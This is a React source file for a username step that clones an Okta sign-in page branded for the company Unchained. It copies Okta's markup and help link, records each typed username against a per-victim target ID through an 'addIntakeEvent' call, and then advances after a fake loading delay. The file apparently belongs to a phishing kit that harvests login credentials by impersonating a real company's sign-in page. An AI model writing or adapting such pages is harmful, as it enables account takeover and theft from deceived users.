import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import brandLogoSrc from "@/app/(tropic)/brandLogoSrc";
import checkForExistingCheckpoint from "@/app/(tropic)/checkForExistingCheckpoint";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import { Passero_One } from "next/font/google";
import { useEffect, useState } from "react";
import { PulseLoader } from "react-spinners";

export default function UsernameForm({ proceed, setParentUsername }) {
    const [blankError, setBlankError] = useState(false);
    const [username, setUsername] = useState('')
    const [loading, setLoading] = useState(false);
    
    async function handleSubmit(e) {
        e.preventDefault();
        if (loading) return;
        if (username.length < 2) {
            setBlankError(true);
            return;
        }
        setBlankError(false);
        setLoading(true);
        addIntakeEvent({
            type: 'input',
            input_title: 'Username',
            input_value: username,
            target_id: await getTargetId()
        });
        setParentUsername(username)
        setTimeout(() => {
            proceed();
        }, 820)

    }
    
    return (
        <main data-se="auth-container" tabIndex="-1" id="okta-sign-in" className="auth-container main-container no-beacon" >
            <div className="okta-sign-in-header auth-header">
                <h1>
                    <img src={brandLogoSrc} className="auth-org-logo" alt="Unchained logo logo" aria-label="Unchained logo logo" />
                </h1>
                <div data-type="beacon-container" className="beacon-container">
                </div>
            </div>
            <div className="auth-content">
                <div className="auth-content-inner">
                    <div className="siw-main-view identify primary-auth">
                        <div className="siw-main-header">
                            <div>
                            </div>
                        </div>
                        <div className="siw-main-body">
                            <form onSubmit={e => handleSubmit(e)} data-se="o-form" slot="content" id="form20" className="ion-form o-form o-form-edit-mode">
                                <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                    <h2 data-se="o-form-head" className="okta-form-title o-form-head">Sign In</h2>
                                    <div className="o-form-info-container">
                                    </div>
                                    <div className="o-form-error-container" data-se="o-form-error-container" role="alert">
                                    </div>
                                    <div className="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                        <div data-se="o-form-fieldset-identifier" className="o-form-fieldset o-form-label-top">
                                            <div data-se="o-form-label" className="okta-form-label o-form-label">
                                                <label htmlFor="input28">Username&nbsp;</label>
                                            </div>
                                            <div data-se="o-form-input-container" className="o-form-input o-form-has-errors">
                                                <span data-se="o-form-input-identifier" className="o-form-input-name-identifier o-form-control okta-form-input-field input-fix o-form-has-errors">
                                                    <input type="text" placeholder="" name="identifier" id="input28" aria-label="" autoComplete="username" aria-describedby="input-container-error48" aria-invalid="true"
                                                        value={username}
                                                        onChange={e => setUsername(e.target.value)}
                                                    />
                                                </span>
                                                {blankError &&
                                                    <p id="input-container-error48" className="okta-form-input-error o-form-input-error o-form-explain" role="alert">
                                                        <span className="icon icon-16 error-16-small" role="img" aria-label="Error">
                                                        </span>This field cannot be left blank
                                                    </p>
                                                }
                                            </div>
                                        </div>
                                        <div data-se="o-form-fieldset-rememberMe" className="o-form-fieldset o-form-label-top">
                                            <div data-se="o-form-input-container" className="o-form-input">
                                                <span data-se="o-form-input-rememberMe" className="o-form-input-name-rememberMe">
                                                    <div className="custom-checkbox">
                                                        <input type="checkbox" name="rememberMe" id="input36" />
                                                        <label htmlFor="input36" data-se-for-name="rememberMe">Keep me signed in</label>
                                                    </div>
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="o-form-button-bar">
                                    {
                                        loading ?
                                            <div className="button button-primary usernameLoadingButton">
                                                <PulseLoader
                                                    color="#f9f9f9"
                                                    className="pulseLoader"
                                                    size={"10px"}
                                                    speedMultiplier={0.6}
                                                />
                                            </div>
                                            :
                                            <input className="button button-primary" type="submit" value="Next" data-type="save" />
                                    }
                                </div>
                            </form>
                        </div>
                        <div className="siw-main-footer">
                            <div className="auth-footer">
                                <a data-se="help" href="https://unchained.okta.com/help/login" target="_blank" rel="noopener noreferrer" className="link js-help">Help</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    )
}